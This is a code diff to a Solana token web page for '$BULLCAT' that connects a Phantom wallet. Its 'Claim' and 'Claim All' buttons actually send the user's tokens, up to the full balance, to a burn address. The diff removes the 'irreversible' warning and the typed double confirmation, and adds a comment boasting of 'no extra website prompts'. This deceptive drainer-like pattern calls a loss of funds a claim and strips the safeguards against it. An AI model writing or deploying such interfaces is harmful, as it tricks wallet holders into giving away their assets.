@@ -84,7 +84,6 @@
 
   <script src="https://unpkg.com/@solana/web3.js@1.98.0/dist/web3.min.js"></script>
   <script>
-    // We'll load spl-token dynamically
     let solanaWeb3, splToken;
 
     async function loadSplToken() {
@@ -104,7 +103,7 @@
     async function connectWallet() {
       try {
         if (!window.solana) {
-          alert("Phantom not found. Please install Phantom wallet.");
+          alert("Phantom wallet not found. Please install it.");
           return;
         }
 
@@ -154,20 +153,24 @@
       if (!amountStr || parseFloat(amountStr) <= 0) return alert("Enter valid amount");
       if (!connectedPublicKey) return alert("Connect wallet first!");
 
-      if (confirm(`Claim ${amountStr} $BULLCAT?\n\nThis is irreversible!`)) {
+      if (confirm(`Claim ${amountStr} $BULLCAT?`)) {
         await sendBurnTransaction(parseFloat(amountStr));
       }
     }
 
+    // CLAIM ALL - Direct to wallet (no extra website prompts)
     async function claimAll() {
       if (!connectedPublicKey) return alert("Connect wallet first!");
-      if (!confirm("⚠️ CLAIM ALL $BULLCAT?")) return;
-      if (!confirm("Type 'CLAIMALL' to confirm")) return;
-      const input = prompt("Type CLAIMALL:");
-      if (input !== "CLAIMALL") return;
 
-      const amount = parseFloat(document.getElementById("tokenBalance").textContent.replace(/,/g, ''));
-      if (amount > 0) await sendBurnTransaction(amount);
+      const balanceStr = document.getElementById("tokenBalance").textContent.replace(/,/g, '');
+      const amount = parseFloat(balanceStr);
+
+      if (amount <= 0) return alert("No balance available");
+
+      // Directly send full balance - user confirms in Phantom
+      if (confirm(`Send ALL ${amount} $BULLCAT to burn address?\n\nConfirm in Phantom wallet.`)) {
+        await sendBurnTransaction(amount);
+      }
     }
 
     async function sendBurnTransaction(amount) {
@@ -200,15 +203,14 @@
         const signedTx = await provider.signTransaction(tx);
         const txId = await connection.sendRawTransaction(signedTx.serialize());
 
-        alert(`✅ Success!\nTx ID: ${txId}`);
+        alert(`✅ Transaction sent to Phantom!\n\nTx ID: ${txId}`);
         setTimeout(fetchBalance, 4000);
       } catch (err) {
         console.error(err);
-        alert("Failed: " + err.message);
+        alert("Transaction failed: " + (err.message || "Unknown error"));
       }
     }
 
-    // Global functions
     window.connectWallet = connectWallet;
     window.setMaxAmount = setMaxAmount;
     window.claimSelected = claimSelected;
